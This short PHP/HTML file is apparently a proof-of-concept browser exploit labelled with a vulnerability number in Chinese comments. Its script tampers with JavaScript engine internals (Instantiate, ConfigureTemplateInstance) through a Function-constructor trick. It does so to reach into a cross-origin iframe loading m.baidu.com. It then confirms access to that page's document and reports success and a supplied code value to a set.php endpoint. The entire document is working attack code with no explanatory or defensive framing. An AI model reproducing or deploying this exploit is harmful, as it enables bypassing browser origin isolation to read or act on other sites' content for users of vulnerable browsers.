<?php
//漏洞编号：114347
?>
<?php
$code = htmlspecialchars(strip_tags($_GET['code']),ENT_QUOTES);
?>
<body>
<script>
frame = document.body.appendChild(document.createElement("iframe"));
frame.src = "http://m.baidu.com/";

frame.onload = function() {

	Function("}, (builtins = this), function() {");
	originalInstantiate = builtins.Instantiate;
	builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {});
	flag = 0;
	template = null;
	builtins.Instantiate = function(x, y) {
		if (flag) {
			doc = frame.contentWindow.document;
            if(doc.domain == "m.baidu.com"){	//payload运行成功
               code ='<?php echo $code;  ?>';
               new Image().src = "../set.php?code=" + code + "&suc=1";
            }
			flag = 0;
		} else if (!template)
			template = x;
        
		return originalInstantiate(x, y);
	};
	document.implementation;
	flag = 1;
	builtins.ConfigureTemplateInstance(frame.contentWindow, template);

   
}


</script>
</body>